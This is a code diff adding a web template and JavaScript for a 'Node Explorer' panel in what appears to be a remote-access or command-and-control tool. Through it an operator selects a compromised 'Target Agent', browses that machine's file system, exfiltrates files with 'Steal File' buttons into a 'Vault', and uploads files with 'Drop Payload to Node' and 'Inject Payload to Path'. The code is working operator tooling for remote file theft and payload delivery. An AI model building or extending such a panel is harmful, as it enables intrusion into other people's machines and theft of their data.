@@ -1,0 +1,230 @@
+{% extends 'core/base.html' %}
+{% block content %}
+<header>
+    <h1>Node Explorer (Remote FTP)</h1>
+</header>
+
+<div class="grid grid-cols-2" style="margin-bottom: 2rem;">
+    <!-- Control Module -->
+    <div class="glass-card" style="animation-delay: 0.1s">
+        <h2 style="font-size: 1.25rem; font-weight: 600; margin-bottom: 1.5rem;">Exploration Parameters</h2>
+        <div class="form-group">
+            <label>Target Agent</label>
+            <select id="agentSelect" style="width: 100%; padding: 0.75rem; border-radius: 6px; background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); color: var(--text);">
+                <option value="">-- Select Active Node --</option>
+                {% for client in clients %}
+                <option value="{{ client.id }}">{{ client.name }} {% if client.status == 'online' %}🟢{% else %}🔴{% endif %}</option>
+                {% endfor %}
+            </select>
+        </div>
+        <div class="form-group" style="display: flex; gap: 1rem; align-items: flex-end;">
+            <div style="flex: 1;">
+                <label>Absolute System Path</label>
+                <input type="text" id="pathInput" placeholder="C:\ or /tmp/" value="." style="width: 100%; padding: 0.75rem; border-radius: 6px; background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); color: var(--text);">
+            </div>
+            <button class="btn" style="height: 44px; padding: 0 1.5rem;" onclick="loadDirectory()">Go</button>
+        </div>
+    </div>
+
+    <!-- Upload Module -->
+    <div class="glass-card" style="animation-delay: 0.2s">
+        <h2 style="font-size: 1.25rem; font-weight: 600; margin-bottom: 1.5rem;">Drop Payload to Node</h2>
+        <form id="uploadForm" onsubmit="uploadFile(event)">
+            {% csrf_token %}
+            <div class="form-group">
+                <label>Select Local Artifact</label>
+                <input type="file" id="fileInput" required style="width: 100%; padding: 0.5rem; background: rgba(0,0,0,0.2); border-radius: 6px; border: 1px dashed rgba(99, 102, 241, 0.5); color: #818cf8;">
+            </div>
+            <button type="submit" class="btn" style="width: 100%; background: #10b981;">🚀 Inject Payload to Path</button>
+        </form>
+        <div id="uploadStatus" style="margin-top: 1rem; color: #10b981; font-weight: 600; display: none;">Payload deployed! Check terminal/API logs.</div>
+    </div>
+</div>
+
+<!-- Output Table -->
+<div class="glass-card" style="animation-delay: 0.3s; min-height: 400px; position: relative;">
+    <div id="loader" style="display: none; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(15, 17, 21, 0.8); z-index: 10; justify-content: center; align-items: center;">
+        <span style="font-weight: 600; color: #818cf8; font-size: 1.1rem; letter-spacing: 1px; animation: pulse 1.5s infinite;">Scanning Interstitial File System...</span>
+    </div>
+    
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem;">
+        <h2 style="font-size: 1.25rem; font-weight: 600; margin: 0;">Remote Hard Drive Map</h2>
+        <span id="currentPathDisplay" style="font-family: monospace; background: rgba(0,0,0,0.4); padding: 0.4rem 0.8rem; border-radius: 6px; color: #a5b4fc; border: 1px solid rgba(255,255,255,0.1);">Initializing...</span>
+    </div>
+
+    <table id="fsTable">
+        <thead>
+            <tr>
+                <th style="width: 50px;">Type</th>
+                <th>File / Folder Name</th>
+                <th>Size (Bytes)</th>
+                <th style="text-align: right;">Action</th>
+            </tr>
+        </thead>
+        <tbody id="fsBody">
+            <tr><td colspan="4" style="text-align: center; color: var(--text-muted); padding: 3rem;">Awaiting target lock. Select agent and hit Go.</td></tr>
+        </tbody>
+    </table>
+</div>
+
+<script>
+    function getCSRF() {
+        return document.querySelector('[name=csrfmiddlewaretoken]').value;
+    }
+
+    function parseTaskOutput(rawOutput) {
+        let match = rawOutput.match(/LOOM_FS_LIST_START\n([\s\S]*?)\nLOOM_FS_LIST_END/);
+        if (match && match[1]) {
+            try { return JSON.parse(match[1]); } catch(e) { return null; }
+        }
+        return null;
+    }
+
+    function pollTask(taskId, callback) {
+        let interval = setInterval(() => {
+            fetch('/api/task/' + taskId + '/')
+                .then(r => r.json())
+                .then(data => {
+                    if (data.status === 'completed' || data.status === 'failed') {
+                        clearInterval(interval);
+                        callback(data);
+                    }
+                });
+        }, 1200);
+    }
+
+    function loadDirectory() {
+        const clientId = document.getElementById('agentSelect').value;
+        const path = document.getElementById('pathInput').value;
+        
+        if (!clientId) { alert('Select an agent first!'); return; }
+        
+        document.getElementById('loader').style.display = 'flex';
+        
+        const fd = new FormData();
+        fd.append('action', 'list');
+        fd.append('client_id', clientId);
+        fd.append('path', path);
+        fd.append('csrfmiddlewaretoken', getCSRF());
+
+        fetch("{% url 'explorer_page' %}", { method: 'POST', body: fd })
+            .then(r => r.json())
+            .then(data => {
+                if(data.task_id) {
+                    pollTask(data.task_id, (result) => {
+                        document.getElementById('loader').style.display = 'none';
+                        const parsedJSON = parseTaskOutput(result.output);
+                        if (parsedJSON) { renderTable(parsedJSON.pwd, parsedJSON.files); }
+                        else { alert('Failed to parse remote directory structural JSON.'); }
+                    });
+                }
+            });
+    }
+
+    function renderTable(pwd, files) {
+        document.getElementById('currentPathDisplay').innerText = pwd;
+        document.getElementById('pathInput').value = pwd;
+        const tbody = document.getElementById('fsBody');
+        tbody.innerHTML = '';
+        
+        // Render back step if not root
+        if(pwd !== '/' && pwd !== '.') {
+            const tr = document.createElement('tr');
+            tr.innerHTML = `
+                <td style="font-size: 1.2rem;">📁</td>
+                <td style="font-weight: 600; cursor: pointer; color: #818cf8;" onclick="navigateUp('${pwd}')">.. (Parent Directory)</td>
+                <td>-</td>
+                <td></td>
+            `;
+            tbody.appendChild(tr);
+        }
+
+        files.forEach(f => {
+            const tr = document.createElement('tr');
+            tr.style.transition = "background 0.2s";
+            tr.onmouseover = function() { tr.style.background = "rgba(255,255,255,0.05)"; }
+            tr.onmouseout = function() { tr.style.background = "transparent"; }
+            
+            const icon = f.is_dir ? '📁' : '📄';
+            const nameClick = f.is_dir ? `onclick="navigateInto('${f.path.replace(/\\/g, '\\\\')}')" style="cursor:pointer; color:#818cf8; font-weight:600;"` : '';
+            
+            const actionBtn = f.is_dir ? '' : `<button onclick="downloadFile('${f.path.replace(/\\/g, '\\\\')}')" style="background:#4f46e5; border:none; padding:4px 10px; border-radius:4px; color:#fff; cursor:pointer; font-size:0.8rem;">📥 Steal File</button>`;
+            
+            tr.innerHTML = `
+                <td style="font-size: 1.2rem;">${icon}</td>
+                <td ${nameClick}>${f.name}</td>
+                <td style="color: var(--text-muted);">${f.is_dir ? '-' : f.size.toLocaleString()}</td>
+                <td style="text-align: right;">${actionBtn}</td>
+            `;
+            tbody.appendChild(tr);
+        });
+        
+        if(files.length === 0) {
+            tbody.innerHTML += `<tr><td colspan="4" style="text-align: center; color: var(--text-muted); padding: 2rem;">Directory empty.</td></tr>`;
+        }
+    }
+
+    function navigateInto(fullPath) {
+        document.getElementById('pathInput').value = fullPath;
+        loadDirectory();
+    }
+
+    function navigateUp(currPath) {
+        document.getElementById('pathInput').value = currPath + "/..";
+        loadDirectory();
+    }
+
+    function downloadFile(fullPath) {
+        const clientId = document.getElementById('agentSelect').value;
+        const fd = new FormData();
+        fd.append('action', 'download');
+        fd.append('client_id', clientId);
+        fd.append('path', fullPath);
+        fd.append('csrfmiddlewaretoken', getCSRF());
+
+        fetch("{% url 'explorer_page' %}", { method: 'POST', body: fd })
+            .then(r => r.json())
+            .then(data => {
+                if(data.task_id) {
+                    alert("Download request dispatched. Monitor the Vault and Control Logs.");
+                }
+            });
+    }
+
+    function uploadFile(e) {
+        e.preventDefault();
+        const clientId = document.getElementById('agentSelect').value;
+        const path = document.getElementById('pathInput').value;
+        const fileInput = document.getElementById('fileInput');
+
+        if (!clientId) { alert('Select an agent!'); return; }
+        if (fileInput.files.length === 0) { return; }
+
+        const fd = new FormData();
+        fd.append('action', 'upload');
+        fd.append('client_id', clientId);
+        fd.append('target_dir', path);
+        fd.append('file', fileInput.files[0]);
+        fd.append('csrfmiddlewaretoken', getCSRF());
+
+        document.getElementById('uploadStatus').innerText = "Uploading to server pipeline...";
+        document.getElementById('uploadStatus').style.display = "block";
+
+        fetch("{% url 'explorer_page' %}", { method: 'POST', body: fd })
+            .then(r => r.json())
+            .then(data => {
+                if(data.task_id) {
+                    document.getElementById('uploadStatus').innerText = "Payload dispatching securely! Check API logs.";
+                    pollTask(data.task_id, (result) => {
+                        document.getElementById('uploadStatus').innerText = "Payload completely injected!";
+                        loadDirectory(); // refresh UI automatically mapping the dropped file
+                        document.getElementById('uploadForm').reset();
+                    });
+                }
+            });
+    }
+</script>
+<style>
+    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+</style>
+{% endblock %}
